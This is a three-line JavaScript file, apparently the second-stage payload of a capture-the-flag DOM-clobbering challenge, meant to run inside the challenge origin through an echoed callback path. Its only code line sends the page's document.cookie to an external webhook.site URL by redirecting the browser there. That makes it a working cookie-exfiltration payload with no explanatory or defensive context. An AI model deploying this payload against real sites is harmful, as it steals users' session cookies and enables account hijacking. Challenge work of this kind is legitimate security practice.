// ch57 DOM Clobbering - exfil stage 2 (executes in challenge-origin iframe, via /callback path echo)
// src = http://CHALLENGE_HOST:PORT/callback/<this file's JS path-encoding>/debug
location='https://webhook.site/64132285-6f03-4744-b2c5-ea7bb2573da3?ck='.concat(document.cookie)
